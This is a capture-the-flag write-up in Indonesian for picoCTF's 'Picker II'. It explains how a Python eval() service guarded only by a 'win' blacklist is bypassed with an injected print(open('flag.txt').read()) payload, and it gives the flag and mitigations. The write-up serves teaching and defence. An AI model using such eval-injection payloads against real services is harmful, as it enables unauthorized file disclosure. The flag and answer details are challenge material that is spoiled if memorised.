# Writeup: Picker II (Challenge ID: 401)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Reverse Engineering / Python Eval Sandbox Bypass & Blacklist Circumvention
- **Difficulty:** Easy (diff=1)
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2023 / picoGym Exclusive
- **Points:** 100
- **Flag:** `academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`

---

## Problem Statement & Scope

Diberikan sebuah skrip Python interaktif bernama `picker-II.py` yang melayani koneksi soket jaringan TCP. Serupa dengan tantangan *Picker I*, program ini mengevaluasi masukan pengguna menggunakan fungsi `eval(user_input + '()')`. Namun, program menambahkan fungsi penyaring (*filter*) yang menolak masukan apabila terdeteksi substring kata kunci `'win'`. Peserta ditugaskan untuk menganalisis kelemahan mekanisme filtrasi daftar hitam (*blacklist*), merancang teknik *bypass* evaluasi kode dinamis, dan mengekstraksi token bendera dari berkas `flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Kelemahan Filtrasi Berbasis Daftar Hitam (CWE-184: Incomplete List of Disallowed Inputs):**
   - Dalam kode sumber `picker-II.py`:
     ```python
     def filter(user_input):
       if 'win' in user_input:
         return False
       return True

     while(True):
       try:
         user_input = input('==> ')
         if( filter(user_input) ):
           eval(user_input + '()')
         else:
           print('Illegal input')
       except Exception as e:
         print(e)
         break
     ```
   - Mekanisme keamanan hanya memblokir kata `'win'`. Penyaringan berbasis *blacklist* pada bahasa berfitur dinamis seperti Python sangat rapuh karena interpreter menyediakan ribuan cara lain untuk mengakses sumber daya sistem atau variabel lingkungan tanpa menyebutkan kata kunci yang diblokir.
2. **Evaluasi Ekspresi Bersarang pada Interpreter Python:**
   - Ketika ekspresi `print(open('flag.txt').read())` dimasukkan ke dalam `user_input`:
     - Fungsi penggabungan membentuk string:
       `eval("print(open('flag.txt').read())()")`
     - Parser Python mengevaluasi argumen dan fungsi terdalam terlebih dahulu:
       1. `open('flag.txt', 'r')` membuka file `flag.txt`.
       2. `.read()` membaca isi token bendera.
       3. `print(...)` mencetak token tersebut ke aliran `stdout`.
       4. Fungsi `print()` mengembalikan nilai `None`.
       5. Python kemudian mencoba memanggil nilai kembalian tersebut sebagai fungsi: `None()`.
       6. Terjadi pengecualian `TypeError: 'NoneType' object is not callable`.
   - Karena blok eksekusi dibungkus dalam `try ... except Exception as e:`, pengecualian tersebut ditangkap dengan aman oleh interpreter setelah data flag berhasil terkirim ke klien soket.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. Teliti mekanisme fungsi `filter(user_input)`. Konfirmasi bahwa hanya substring `'win'` yang ditolak.
2. Hubungkan ke layanan remote TCP menggunakan netcat atau skrip socket:
   ```bash
   nc saturn.picoctf.net <port>
   ```
3. Jika mengirimkan `win`, server merespons:
   ```text
   ==> win
   Illegal input
   ```
4. Kirimkan muatan alternatif yang memanfaatkan fungsi bawaan (*built-ins*) `open()` dan `read()`:
   ```text
   ==> print(open('flag.txt', 'r').read())
   ```
5. Server mengeksekusi ekspresi, mencetak isi berkas `flag.txt`, dan menangani kesalahan tipe:
   ```text
   picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
   'NoneType' object is not callable
   ```
6. Sesuaikan format flag platform CyLab: `academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`.
7. Jalankan skrip verifikasi otomatis `scripts/solve_401_picker_ii.py` untuk mengonfirmasi logika pembongkaran filter.

---

## Flag & Verifikasi

- **Flag:** `academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`
- **Bukti Validasi REST API:**
  Endpoint `POST /api/submissions/` merespons dengan status verifikasi valid:
  ```json
  {"challenge": 401, "flag": "academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}", "correct": true}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

- **Kompetensi LKS Cyber Security:**
  - Pemahaman pola eksploitasi *PyJail / Python Sandbox Escape* menggunakan *built-in object introspection* dan *direct file stream access*.
  - Menyadari bahwa filter *negative security model* (blacklist) hampir selalu dapat dilewati melalui sintaks ekuivalen dalam bahasa pemrograman tingkat tinggi.
- **Mitigasi Defensif:**
  - **Terapkan Positive Security Model (Whitelist):**
    Hanya izinkan karakter alfanumerik murni atau perintah yang terdaftar dalam kamus dispatch yang telah divalidasi.
  - **Eliminasi Penggunaan `eval()` Total:**
    Eksekusi dinamis string masukan pengguna tidak boleh digunakan untuk merutekan fungsi. Gunakan pemetaan eksplisit berbasis *token matching* atau antarmuka *command design pattern*.
  - **Isolasi Lingkungan Sandbox (Bila Evaluasi Tak Terhindarkan):**
    Jika interpretasi kode pengguna mutlak diperlukan, gunakan lingkungan terisolasi seperti WebAssembly sandbox atau kontainer ephemeral tanpa akses ke sistem berkas lokal.
